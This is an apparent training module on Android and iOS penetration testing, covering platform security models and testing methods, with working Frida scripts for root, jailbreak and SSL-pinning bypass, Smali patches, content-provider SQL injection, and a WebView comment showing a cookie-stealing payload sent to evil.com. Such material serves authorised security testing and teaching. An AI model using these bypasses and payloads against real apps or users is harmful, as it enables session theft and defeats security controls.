# Module 4.10: Mobile Application Security — Android and iOS Penetration Testing

> **Module 04.10** · **Last updated:** 2026-05-07

## Guiding ideas
1. **Mobile is not "web on a small screen" — unique attack surfaces demand specialized methodology.**
2. **Platform security models are your first line of defense — understand them deeply before attempting to break them.**
3. **Static + Dynamic + Network + Storage: a complete mobile pentest covers all four domains.**
4. **OWASP Mobile Top 10 2024 is the baseline, not the ceiling.**

**Date:** 2026-05-07
**Status:** Completed

---

## 1. Mobile Security Landscape

### 1.1 OWASP Mobile Top 10 (2024)

| Rank | Category | Description |
|------|----------|-------------|
| M1 | Improper Credential Usage | Hardcoded credentials, insecure credential storage |
| M2 | Inadequate Supply Chain Security | Third-party SDK vulnerabilities, compromised build pipelines |
| M3 | Insecure Authentication/Authorization | Weak biometric implementation, broken session handling |
| M4 | Insufficient Input/Output Validation | Client-side injection, format string attacks |
| M5 | Insecure Communication | Cleartext traffic, weak TLS, certificate validation failures |
| M6 | Inadequate Privacy Controls | PII leakage, excessive data collection, missing consent |
| M7 | Insufficient Binary Protections | Lack of obfuscation, no anti-tampering, debuggable releases |
| M8 | Security Misconfiguration | Exported components, debug flags, overly broad permissions |
| M9 | Insecure Data Storage | Plaintext SQLite, world-readable SharedPreferences, unprotected Keychain |
| M10 | Insufficient Cryptography | Hardcoded keys, deprecated algorithms, improper IV/nonce reuse |

### 1.2 Mobile-Specific Attack Surface

The mobile attack surface is fundamentally different from traditional web/desktop:

**Application Layer:**
- Binary reverse engineering (DEX bytecode, Mach-O binaries)
- Inter-Process Communication abuse (Intents, URL schemes, Universal Links)
- Local data storage (SQLite, Realm, SharedPreferences, Keychain)
- WebView bridges (JavaScript ↔ Native code boundary)
- Third-party SDK vulnerabilities (analytics, ads, crash reporting)

**Network Layer:**
- Man-in-the-Middle on untrusted Wi-Fi networks
- Certificate pinning bypass
- Custom protocol interception (MQTT, WebSocket, gRPC, Protobuf)
- DNS spoofing on mobile networks
- Rogue base station attacks (IMSI catchers)

**Device Layer:**
- Physical access attacks (USB debugging, bootloader unlock)
- Rooted/jailbroken device exploitation
- Sensor data leakage (gyroscope, accelerometer as side channels)
- Clipboard interception across applications
- Screenshot capture during multitasking
- Backup extraction (adb backup, iTunes/Finder backup)

**Server-Side Layer:**
- API endpoint enumeration (mobile APIs often less hardened than web)
- Broken object-level authorization (BOLA/IDOR via mobile API)
- Rate limiting gaps (mobile APIs frequently lack throttling)
- Push notification token theft and abuse
- Backend-For-Frontend (BFF) pattern weaknesses

### 1.3 Mobile Threat Actors

**State-Sponsored (APT):**
- NSO Group Pegasus (zero-click iOS exploitation)
- Intellexa Predator (Android/iOS surveillance)
- Operation Triangulation (iMessage zero-click chain)
- Capabilities: zero-day chains, IMSI catcher deployment, lawful intercept abuse
- Targets: journalists, activists, political dissidents, diplomats

**Organized Criminal Groups:**
- Banking trojan operators (Anatsa, Xenomorph, SharkBot)
- Ransomware-as-a-Service adapted for mobile
- SIM swapping syndicates (social engineering + mobile takeover)
- Smishing (SMS phishing) campaigns at scale
- Fake app distribution rings (clone legitimate apps, inject malware)

**Competitor/Corporate Espionage:**
- Reverse engineering competitor applications
- API scraping via instrumented mobile clients
- Trade secret theft from enterprise mobile apps
- Supply chain compromise targeting mobile SDKs

**Insider Threats:**
- Developers with access to signing keys and CI/CD
- Mobile Device Management (MDM) administrators
- App store account credential theft

### 1.4 Mobile Malware Categories

**Spyware:**
- Pegasus, Predator, Hermit (commercial surveillance)
- Capabilities: microphone/camera activation, message interception, location tracking
- Persistence: kernel exploits, zero-click delivery, profile abuse (iOS)
- Detection evasion: runs in kernel space, no app icon, encrypted C2

**Banking Trojans:**
- Anatsa, Xenomorph, SharkBot, GodFather, Vultur
- Overlay attacks: inject fake login screens over legitimate banking apps
- Accessibility service abuse: keylogging, screen recording, automated transfers
- SMS interception: steal OTP codes for 2FA bypass
- Distribution: dropper apps on Google Play, smishing links

**Ransomware:**
- Mobile-specific: screen lockers, file encryptors
- Android-dominant due to sideloading ecosystem
- DoubleLocker: encrypts files AND locks device with PIN change
- Scarier trend: threatware (threaten to publish stolen photos/messages)

**Adware / PUP (Potentially Unwanted Programs):**
- Aggressive ad injection, hidden ads (invisible pixels generating revenue)
- Data harvesting beyond declared permissions
- Clicker fraud (automated background ad engagement)
- Often distributed through legitimate app stores (delay malicious behavior)

### 1.5 Platform Security Model Comparison

| Feature | Android | iOS |
|---------|---------|-----|
| **Kernel** | Modified Linux kernel | XNU (Mach + BSD hybrid) |
| **App Isolation** | UID-per-app + SELinux mandatory access control | Sandbox (Seatbelt) + entitlements |
| **IPC** | Binder (Intents, Content Providers, Broadcasts) | XPC, URL Schemes, Universal Links, App Groups |
| **Code Signing** | Developer key (self-signed allowed for sideload) | Apple-issued certificate required |
| **Sideloading** | Permitted (APK install from unknown sources) | Restricted (Enterprise certs, AltStore, TestFlight, EU DMA sideload) |
| **Root/Jailbreak** | Magisk, KernelSU (common, well-tooled) | checkra1n, palera1n, Dopamine (more restricted) |
| **Hardware Security** | Titan M2 / TrustZone TEE + StrongBox | Secure Enclave Processor (SEP) |
| **Permission Model** | Runtime permissions (dangerous), install-time (normal) | Runtime prompts, App Tracking Transparency |
| **Verified Boot** | Android Verified Boot (AVB) with dm-verity | Secure Boot Chain (iBoot → kernel → userspace) |
| **Memory Safety** | ASLR, MTE (ARMv8.5+), CFI | ASLR, PAC (A12+), MTE (A17+), PPL |

---

## 2. Android Security Architecture

### 2.1 Linux Kernel Security

Android builds on the Linux kernel with additional hardening:

**SELinux (Security-Enhanced Linux):**
- Enforcing mode since Android 5.0 (mandatory — cannot be set to permissive without root)
- Type Enforcement: every process and file has a security context (label)
- Policy defines allowed interactions between domains (types)
- `untrusted_app` domain: all third-party apps run here
- `platform_app` domain: system apps signed with platform key
- Prevents privilege escalation even if app achieves code execution

```
# Example SELinux denial in logcat:
# avc: denied { read } for pid=1234 comm="com.example.app"
# name="passwd" dev="dm-0" ino=1234
# scontext=u:r:untrusted_app:s0:c512,c768
# tcontext=u:object_r:system_file:s0 tclass=file
```

**Seccomp-BPF (Secure Computing Mode):**
- Filters system calls available to processes
- Android applies baseline seccomp filter to all apps (Zygote-forked)
- Blocks dangerous syscalls: `mount`, `reboot`, `init_module`, `kexec_load`
- Architecture-specific filters (ARM64 vs x86)
- Violation = `SIGKILL` (process termination, no graceful handling)

**Kernel Hardening:**
- KASLR (Kernel Address Space Layout Randomization)
- PAN (Privileged Access Never) — kernel cannot access userspace memory directly
- CFI (Control Flow Integrity) — prevents ROP/JOP attacks
- Memory Tagging Extension (MTE) on supported SoCs (Pixel 8+)

### 2.2 Application Sandbox

Every Android app runs in its own process with a unique Linux UID:

```
# App installation creates:
# UID: u0_a123 (10123)
# Data dir: /data/data/com.example.app/ (mode 0700, owned by u0_a123)
# SELinux context: u:r:untrusted_app:s0:c512,c768
```

**UID Isolation:**
- Each app gets a unique UID at install time (10000–19999 range)
- Filesystem permissions enforce isolation (app cannot read another app's `/data/data/`)
- Network socket ownership tracked by UID (iptables per-app rules)
- `sharedUserId` (deprecated API 29+) allowed apps signed with same key to share UID

**Process Isolation:**
- Apps fork from Zygote process (pre-loaded ART runtime)
- Each app has its own Dalvik/ART virtual machine instance
- Native code (JNI) runs in same process but under same UID/SELinux constraints
- Multi-process apps still share the same UID

### 2.3 Android Permission Model

**Normal Permissions** (granted at install, no user prompt):
- `INTERNET`, `ACCESS_NETWORK_STATE`, `BLUETOOTH`, `NFC`
- `VIBRATE`, `WAKE_LOCK`, `SET_ALARM`, `RECEIVE_BOOT_COMPLETED`
- Risk: apps can freely access network without user awareness

**Dangerous Permissions** (runtime prompt required):
- Groups: `CAMERA`, `MICROPHONE`, `LOCATION`, `CONTACTS`, `STORAGE`, `PHONE`, `SMS`, `CALENDAR`, `SENSORS`
- One-time permissions (Android 11+): location, camera, mic revoke after session
- Background location requires separate explicit grant (Android 10+)
- Nearby devices permission (Android 12+) for Bluetooth scanning

**Signature Permissions:**
- Granted only to apps signed with same certificate as declaring app
- Used for inter-app trust (e.g., Google apps trusting each other)
- `android:protectionLevel="signature"`

**System/Privileged Permissions:**
- `INSTALL_PACKAGES`, `READ_LOGS`, `DUMP`
- Only available to apps in `/system/priv-app/` or signed with platform key
- Cannot be obtained by third-party apps under normal circumstances

### 2.4 Verified Boot and dm-verity

**Android Verified Boot (AVB):**
- Boot chain: ROM bootloader → verified bootloader → verified kernel → verified system
- `vbmeta` structure contains hash of boot/system/vendor partitions
- Rollback protection prevents downgrade attacks (monotonic counter in hardware)
- Locked bootloader = full chain verified; unlocked = user warned, data wiped

**dm-verity:**
- Block-level integrity verification of `/system`, `/vendor`, `/product` partitions
- Merkle tree (hash tree) of all blocks stored in vbmeta
- Each block verified on read (not ahead of time) — transparent to userspace
- Corruption detected → I/O error returned (not silent data corruption)
- Cannot modify system partition without breaking verification chain

### 2.5 Keystore and StrongBox

**Android Keystore System:**
- Hardware-backed key storage (TEE or StrongBox)
- Keys are non-exportable — crypto operations happen inside secure hardware
- Key attestation: proves to remote server that key is hardware-bound
- Supports RSA, EC, AES, HMAC with configurable usage constraints

**StrongBox (Titan M2 on Pixel, equivalent on other OEMs):**
- Dedicated tamper-resistant hardware security module
- Physically separate from main SoC
- Resistant to side-channel attacks (power analysis, EM emanation)
- Limited algorithm support (EC P-256, AES-256, HMAC-SHA256, RSA 2048)
- Slower but higher security guarantee than TEE

**Key Usage Constraints:**
```java
// Key generation with security constraints
KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder("my_key", PURPOSE_ENCRYPT | PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setKeySize(256)
    .setUserAuthenticationRequired(true)            // Require biometric/PIN
    .setUserAuthenticationValidityDurationSeconds(30) // Auth valid for 30s
    .setIsStrongBoxBacked(true)                     // Use StrongBox if available
    .setUnlockedDeviceRequired(true)                // Only usable when unlocked
    .build();
```

### 2.6 SafetyNet / Play Integrity API

**SafetyNet Attestation (deprecated 2024, replaced by Play Integrity):**
- Device integrity check: is device rooted? Is bootloader unlocked?
- CTS profile match: does device pass Compatibility Test Suite?
- Easily bypassed with Magisk + custom props

**Play Integrity API (current):**
- Three verdict levels:
  - `MEETS_BASIC_INTEGRITY`: may be rooted but genuine device
  - `MEETS_DEVICE_INTEGRITY`: unmodified device, bootloader locked
  - `MEETS_STRONG_INTEGRITY`: recent security patch, hardware-backed attestation
- Server-side verification (nonce + token → Google servers → verdict)
- Harder to bypass than SafetyNet but Magisk + Play Integrity Fix still circumvents

### 2.7 Scoped Storage

Introduced Android 10, enforced Android 11+:
- Apps cannot access arbitrary files on external storage
- MediaStore API for media files (photos, videos, audio)
- Storage Access Framework (SAF) for documents
- App-specific directory: `/storage/emulated/0/Android/data/com.example.app/` (no permission needed but visible to user)
- Security impact: malware cannot harvest all user photos without explicit user grant via file picker

### 2.8 BiometricPrompt Security

- Cryptographic authentication: biometric unlocks a key in Keystore
- `setUserAuthenticationRequired(true)` + `setUserAuthenticationParameters()`
- Class 3 (Strong) biometrics: fingerprint, 3D face (cannot be spoofed with photo)
- Class 2 (Weak) biometrics: 2D face recognition (can be spoofed)
- `setAllowedAuthenticators()`: app controls which classes are acceptable
- Auth-per-use vs time-based validity window

---

## 3. Android Penetration Testing

### 3.1 Static Analysis

**Decompilation with jadx:**
```bash
# Decompile APK to Java source (best effort)
jadx -d output_dir target.apk

# Decompile with deobfuscation attempts
jadx --deobf --deobf-min 3 --deobf-max 64 -d output_dir target.apk

# Search for hardcoded secrets in decompiled source
grep -rn "api_key\|api_secret\|password\|token\|firebase" output_dir/sources/

# Search for insecure crypto usage
grep -rn "DES\|MD5\|SHA1\|ECB\|getInsecure\|TrustAllCerts" output_dir/sources/
```

**APK extraction with apktool:**
```bash
# Decode APK (resources + Smali)
apktool d target.apk -o decoded_apk

# Key files to examine:
# decoded_apk/AndroidManifest.xml      — permissions, exported components
# decoded_apk/res/values/strings.xml   — hardcoded strings
# decoded_apk/smali/                   — Smali bytecode
# decoded_apk/assets/                  — bundled databases, config files
# decoded_apk/lib/                     — native .so libraries

# Rebuild after modification
apktool b decoded_apk -o modified.apk
```

**dex2jar conversion:**
```bash
# Convert DEX to JAR for analysis in JD-GUI or similar
d2j-dex2jar target.apk -o target.jar

# Open in JD-GUI or use cfr decompiler
java -jar cfr.jar target.jar --outputdir ./decompiled
```

**Smali Code Analysis:**

Smali is the human-readable representation of Dalvik bytecode. Understanding it is essential for patching:

```smali
# Example: Root detection method in Smali
.method public isDeviceRooted()Z
    .locals 2

    # Check for su binary
    const-string v0, "/system/bin/su"
    new-instance v1, Ljava/io/File;
    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/io/File;->exists()Z
    move-result v0
    if-eqz v0, :cond_0
    const/4 v0, 0x1
    return v0

    :cond_0
    # Check for Magisk
    const-string v0, "/sbin/magisk"
    new-instance v1, Ljava/io/File;
    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/io/File;->exists()Z
    move-result v0
    return v0
.end method
```

**Patching Smali to bypass root detection:**
```smali
# Patched version: always returns false (not rooted)
.method public isDeviceRooted()Z
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
```

**APK Signing and Zipaligning:**
```bash
# Generate signing key (one-time)
keytool -genkey -v -keystore debug.keystore -alias debug \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass android -keypass android

# Zipalign (4-byte boundary alignment for performance)
zipalign -v 4 modified.apk aligned.apk

# Sign with apksigner (v2 + v3 signing)
apksigner sign --ks debug.keystore --ks-pass pass:android aligned.apk

# Verify signature
apksigner verify --verbose aligned.apk
```

### 3.2 Dynamic Analysis

**Frida Framework:**

Frida is the most powerful tool for mobile dynamic analysis. It injects a JavaScript engine into target processes.

```bash
# Start Frida server on device (requires root)
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server-16.x.x-android-arm64
adb shell /data/local/tmp/frida-server-16.x.x-android-arm64 &

# List running processes
frida-ps -U

# Attach to running app
frida -U com.example.app

# Spawn app with Frida attached from start
frida -U -f com.example.app --no-pause
```

**Frida Script — Enumerate loaded classes:**
```javascript
// enumerate_classes.js
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.includes("security") || className.includes("crypto")) {
                console.log("[+] Security class: " + className);
            }
        },
        onComplete: function() {
            console.log("[*] Class enumeration complete");
        }
    });
});
```

**Frida Script — Hook method and modify return value:**
```javascript
// bypass_root_detection.js
Java.perform(function() {
    // Hook the root detection method
    var targetClass = Java.use("com.example.app.security.RootDetector");
    
    targetClass.isDeviceRooted.implementation = function() {
        console.log("[*] isDeviceRooted() called — returning false");
        return false;
    };

    targetClass.checkSuBinary.implementation = function() {
        console.log("[*] checkSuBinary() called — returning false");
        return false;
    };

    targetClass.checkMagiskPresence.implementation = function() {
        console.log("[*] checkMagiskPresence() called — returning false");
        return false;
    };
});
```

**Objection Framework:**

Objection wraps Frida with pre-built commands for common tasks:

```bash
# Install objection
pip install objection

# Connect to running app
objection -g com.example.app explore

# Common objection commands:
# List activities
android hooking list activities

# List services
android hooking list services

# List broadcast receivers
android hooking list receivers

# Search for classes matching pattern
android hooking search classes root

# Hook all methods in a class and log arguments
android hooking watch class com.example.app.security.RootDetector

# Watch a specific method with arguments and return value
android hooking watch class_method com.example.app.security.RootDetector.isRooted --dump-args --dump-return

# Dump Android Keystore
android keystore list

# List app's internal storage
env

# Bypass SSL pinning
android sslpinning disable

# Bypass root detection
android root disable
```

**MobSF (Mobile Security Framework):**
```bash
# Run MobSF via Docker
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Upload APK via web UI at http://localhost:8000
# Or use REST API:
curl -F "file=@target.apk" http://localhost:8000/api/v1/upload \
  -H "Authorization: <API_KEY>"

# MobSF performs:
# - Manifest analysis (exported components, permissions)
# - Code analysis (hardcoded secrets, weak crypto, insecure storage)
# - Binary analysis (PIE, RELRO, stack canaries)
# - Network security config analysis
# - Malware pattern matching
# - Tracker/SDK detection
```

### 3.3 Root Detection Bypass

**Magisk (Systemless Root):**
- Mounts over `/system` without modifying it — dm-verity remains valid
- MagiskHide / Zygisk DenyList: hides root from specific apps
- Magisk modules modify system behavior without touching `/system` partition
- Play Integrity Fix module: spoofs device attestation

**Frida Script — Comprehensive Root Detection Bypass:**
```javascript
// universal_root_bypass.js
Java.perform(function() {
    // 1. Bypass file-based checks
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var filePath = this.getAbsolutePath();
        var rootIndicators = [
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/app/Superuser.apk", "/data/local/xbin/su",
            "/data/local/bin/su", "/system/sd/xbin/su",
            "/sbin/magisk", "/system/bin/magisk"
        ];
        for (var i = 0; i < rootIndicators.length; i++) {
            if (filePath === rootIndicators[i]) {
                console.log("[*] Hiding root file: " + filePath);
                return false;
            }
        }
        return this.exists();
    };

    // 2. Bypass Runtime.exec("which su") checks
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf("su") !== -1 || cmd.indexOf("magisk") !== -1) {
            console.log("[*] Blocked command: " + cmd);
            throw Java.use("java.io.IOException").$new("Permission denied");
        }
        return this.exec(cmd);
    };

    // 3. Bypass Build.TAGS check (test-keys vs release-keys)
    var Build = Java.use("android.os.Build");
    Build.TAGS.value = "release-keys";

    // 4. Bypass PackageManager check for Magisk/SuperSU
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkgName, flags) {
        var rootPackages = [
            "com.topjohnwu.magisk", "eu.chainfire.supersu",
            "com.koushikdutta.superuser", "com.noshufou.android.su"
        ];
        for (var i = 0; i < rootPackages.length; i++) {
            if (pkgName === rootPackages[i]) {
                console.log("[*] Hiding package: " + pkgName);
                throw Java.use("android.content.pm.PackageManager$NameNotFoundException").$new();
            }
        }
        return this.getPackageInfo(pkgName, flags);
    };

    // 5. Bypass system property checks
    var SystemProperties = Java.use("android.os.SystemProperties");
    SystemProperties.get.overload('java.lang.String').implementation = function(key) {
        if (key === "ro.build.selinux" || key === "ro.debuggable") {
            return "0";
        }
        return this.get(key);
    };
});
```

### 3.4 SSL Pinning Bypass

**Method 1 — Frida Script (custom):**
```javascript
// ssl_pinning_bypass.js
Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[*] OkHttp3 pinning bypassed for: " + hostname);
            return;
        };
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function(hostname, certs) {
            console.log("[*] OkHttp3 pinning bypassed for: " + hostname);
            return;
        };
    } catch(e) {
        console.log("[-] OkHttp3 CertificatePinner not found");
    }

    // Bypass TrustManagerImpl (system-level)
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log("[*] TrustManagerImpl bypassed for: " + host);
            return untrustedChain;
        };
    } catch(e) {
        console.log("[-] TrustManagerImpl not found");
    }

    // Bypass Retrofit/OkHttp HostnameVerifier
    try {
        var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        
        // Create a TrustManager that accepts all certs
        var TrustManager = Java.registerClass({
            name: "com.bypass.TrustManager",
            implements: [Java.use("javax.net.ssl.X509TrustManager")],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        console.log("[+] Custom TrustManager registered");
    } catch(e) {
        console.log("[-] TrustManager bypass failed: " + e);
    }

    // Bypass Network Security Config
    try {
        var NetworkSecurityConfig = Java.use("android.security.net.config.NetworkSecurityConfig");
        NetworkSecurityConfig.isCleartextTrafficPermitted.implementation = function() {
            return true;
        };
    } catch(e) {
        console.log("[-] NetworkSecurityConfig not found");
    }
});
```

**Method 2 — Objection:**
```bash
# One command — handles most pinning implementations
objection -g com.example.app explore -c "android sslpinning disable"
```

**Method 3 — Network Security Config patch (static):**

Modify `decoded_apk/res/xml/network_security_config.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- Trust user-installed certs -->
        </trust-anchors>
    </base-config>
</network-security-config>
```

Ensure `AndroidManifest.xml` references it:
```xml
<application android:networkSecurityConfig="@xml/network_security_config" ...>
```

### 3.5 Content Provider Exploitation

Content Providers expose structured data between apps. Misconfigured providers leak data:

```bash
# Find exported content providers in Manifest
grep -A5 "provider" decoded_apk/AndroidManifest.xml | grep -i "exported\|authorities"

# Query content provider from adb shell
adb shell content query --uri content://com.example.app.provider/users

# Insert data
adb shell content insert --uri content://com.example.app.provider/users \
  --bind name:s:hacker --bind email:s:evil@example.com

# SQL injection in content provider
adb shell content query --uri "content://com.example.app.provider/users" \
  --where "1=1) UNION SELECT sql FROM sqlite_master--"
```

**Frida Script — Content Provider enumeration:**
```javascript
// enumerate_providers.js
Java.perform(function() {
    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var pm = context.getPackageManager();
    var packages = pm.getInstalledPackages(0x8); // GET_PROVIDERS

    for (var i = 0; i < packages.size(); i++) {
        var pkg = packages.get(i);
        if (pkg.providers !== null) {
            for (var j = 0; j < pkg.providers.length; j++) {
                var provider = pkg.providers[j];
                if (provider.exported) {
                    console.log("[EXPORTED] " + provider.authority + " (" + pkg.packageName + ")");
                }
            }
        }
    }
});
```

### 3.6 Broadcast Receiver Abuse

```bash
# Find exported broadcast receivers
grep -B2 -A10 "receiver" decoded_apk/AndroidManifest.xml

# Send broadcast to exported receiver
adb shell am broadcast -a com.example.app.DEBUG_ACTION \
  --es command "dump_database"

# Sniff broadcasts with drozer (or custom receiver)
adb shell am broadcast -a android.intent.action.BATTERY_CHANGED
```

### 3.7 Deep Link Exploitation

```bash
# Find deep link schemes in Manifest
grep -A20 "intent-filter" decoded_apk/AndroidManifest.xml | grep -B5 -A5 "scheme\|host\|pathPrefix"

# Trigger deep link
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://deeplink/transfer?to=attacker&amount=1000" com.example.app

# Test for parameter injection
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://login?redirect=https://evil.com" com.example.app
```

### 3.8 WebView Vulnerabilities

**JavaScript Bridge abuse:**
```javascript
// Frida: Hook addJavascriptInterface to find exposed methods
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[!] JavascriptInterface added: " + name);
        console.log("    Object class: " + obj.getClass().getName());
        
        // List all methods of the exposed object
        var methods = obj.getClass().getMethods();
        for (var i = 0; i < methods.length; i++) {
            if (methods[i].isAnnotationPresent(Java.use("android.webkit.JavascriptInterface").class)) {
                console.log("    @JavascriptInterface: " + methods[i].getName());
            }
        }
        return this.addJavascriptInterface(obj, name);
    };
});
```

**`file:///` URI exploitation (pre-API 30):**
```bash
# If WebView loads file:// URIs, attempt local file read
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=file:///data/data/com.example.app/databases/users.db"
```

**Universal XSS in WebView:**
```javascript
// If setJavaScriptEnabled(true) and loadUrl accepts user input:
// Inject: javascript:void(AndroidBridge.getToken())
// Or:    javascript:void(fetch('https://evil.com/?cookie='+document.cookie))
```

---

## 4. iOS Security Architecture

### 4.1 Secure Enclave Processor (SEP)

The Secure Enclave is a dedicated security coprocessor:

- Separate from main application processor (dedicated L4 microkernel)
- Handles all biometric data (Face ID / Touch ID)
- Stores device encryption keys (UID key fused at manufacture)
- Keys never leave the SEP — main processor sends requests, receives results
- Secure boot independently verified (sepOS has its own boot ROM)
- Counter lockout: prevents brute force (progressive delays, data erasure)
- Hardware random number generator (TRNG)
- Anti-replay mechanisms (monotonic counter)

### 4.2 Data Protection Classes

iOS encrypts files with class keys, which are protected by the device passcode and hardware UID key:

| Class | Constant | Available When | Use Case |
|-------|----------|----------------|----------|
| A | `NSFileProtectionComplete` | Device unlocked only | Sensitive user data (messages, photos) |
| B | `NSFileProtectionCompleteUnlessOpen` | While file handle open | Email attachments being downloaded |
| C | `NSFileProtectionCompleteUntilFirstUserAuthentication` | After first unlock (default) | Most app data |
| D | `NSFileProtectionNone` | Always (even before first unlock) | System files that must be available at boot |

**Keychain Protection Classes:**

| Class | Description |
|-------|-------------|
| `kSecAttrAccessibleWhenUnlocked` | Available only when device unlocked |
| `kSecAttrAccessibleAfterFirstUnlock` | Available after first unlock (persists through sleep) |
| `kSecAttrAccessibleAlways` | **Deprecated, insecure** — always available |
| `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` | Requires passcode set, device-bound, deleted if passcode removed |

### 4.3 App Transport Security (ATS)

- Enforces HTTPS for all network connections by default (since iOS 9)
- Minimum TLS 1.2, forward secrecy required
- Certificate must use SHA-256+ signature, RSA 2048+ or EC 256+ key
- Exceptions declared in `Info.plist` (reviewers scrutinize these)

```xml
<!-- Info.plist: ATS exceptions (red flags during pentest) -->
<key>NSAppTransportSecurity</key>
<dict>
    <!-- BAD: Disables ATS entirely -->
    <key>NSAllowsArbitraryLoads</key>
    <true/>
    
    <!-- Slightly less bad: exception for specific domain -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>legacy-api.example.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.0</string>
        </dict>
    </dict>
</dict>
```

### 4.4 Keychain Services

**Access Groups:**
- App's own keychain: `<TeamID>.<BundleID>`
- Shared keychain: `<TeamID>.com.example.shared` (apps with same Team ID)
- Keychain items have access control lists (ACLs) determining read conditions
- Backup behavior: items with `ThisDeviceOnly` excluded from backups

**Security Assessment During Pentest:**
- Items stored with `kSecAttrAccessibleAlways` → HIGH (available even when locked)
- Items without `ThisDeviceOnly` suffix → MEDIUM (migrates to new device via backup)
- Missing `kSecAttrAccessControl` with biometric → INFO (no additional auth layer)

### 4.5 Code Signing and Provisioning

- Every executable page must be signed by Apple-issued certificate
- Provisioning profiles link: Developer Certificate + App ID + Device UDIDs + Entitlements
- `amfi` (Apple Mobile File Integrity) daemon verifies signatures at page fault time
- Code signing enforced at kernel level (`MACF` hooks)
- Entitlements: XML plist embedded in signature specifying app capabilities
- `get-task-allow`: if `true`, debugger can attach (debug builds only)

### 4.6 Sandbox Architecture

**App Container:**
```
/var/mobile/Containers/
├── Bundle/Application/<UUID>/         # Read-only app bundle (.app)
├── Data/Application/<UUID>/           # Read-write app data
│   ├── Documents/                     # User-visible, backed up
│   ├── Library/
│   │   ├── Caches/                    # Not backed up, may be purged
│   │   ├── Preferences/              # NSUserDefaults plist
│   │   └── Application Support/      # App-specific support files
│   └── tmp/                           # Temporary files
└── Shared/AppGroup/<GroupID>/         # Shared with same-group apps
```

**Sandbox Enforcement:**
- Seatbelt profiles (compiled sandbox rules) restrict syscalls per process
- Apps cannot access other apps' containers
- No direct filesystem access outside sandbox (SAF equivalent via document picker)
- IPC restricted to approved mechanisms (URL schemes, Universal Links, App Groups)

### 4.7 Pointer Authentication Codes (PAC) — A12+

- Hardware-assisted pointer signing (ARM pointer authentication)
- Pointers include a cryptographic signature in upper unused bits
- PAC verified before pointer dereference — corruption triggers fault
- Mitigates: ROP, JOP, arbitrary code execution from memory corruption
- Keys diversified per-process (different processes have different PAC keys)
- A-key (instruction pointers): protects return addresses and function pointers
- B-key (data pointers): protects data structures and vtables
- Attacker must forge valid PAC to redirect control flow (hardware-dependent brute force infeasible)

---

## 5. iOS Penetration Testing

### 5.1 Jailbreak Detection and Bypass

**Common Jailbreak Detection Checks:**
1. File existence: `/Applications/Cydia.app`, `/bin/bash`, `/usr/sbin/sshd`, `/etc/apt`
2. URL scheme: `cydia://` openable
3. Sandbox violation: write to `/private/var/mobile/`
4. Fork/exec: `fork()` succeeds (sandbox normally blocks this)
5. Dynamic library injection: `_dyld_get_image_count()` shows unexpected dylibs
6. System call availability: `ptrace(PT_DENY_ATTACH)` detects debugger

**Frida Jailbreak Bypass Script:**
```javascript
// ios_jailbreak_bypass.js
var resolver = new ApiResolver("objc");

// 1. Hook NSFileManager fileExistsAtPath:
var fileExistsMatches = resolver.enumerateMatches("-[NSFileManager fileExistsAtPath:]");
if (fileExistsMatches.length > 0) {
    Interceptor.attach(fileExistsMatches[0].address, {
        onEnter: function(args) {
            this.path = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            var jailbreakPaths = [
                "/Applications/Cydia.app",
                "/Library/MobileSubstrate/MobileSubstrate.dylib",
                "/bin/bash", "/usr/sbin/sshd", "/etc/apt",
                "/usr/bin/ssh", "/private/var/lib/apt/",
                "/private/var/lib/cydia", "/private/var/stash",
                "/usr/libexec/cydia/", "/var/cache/apt",
                "/var/lib/dpkg/", "/usr/bin/cycript"
            ];
            for (var i = 0; i < jailbreakPaths.length; i++) {
                if (this.path.indexOf(jailbreakPaths[i]) !== -1) {
                    console.log("[*] Hiding jailbreak path: " + this.path);
                    retval.replace(0x0);
                    return;
                }
            }
        }
    });
}

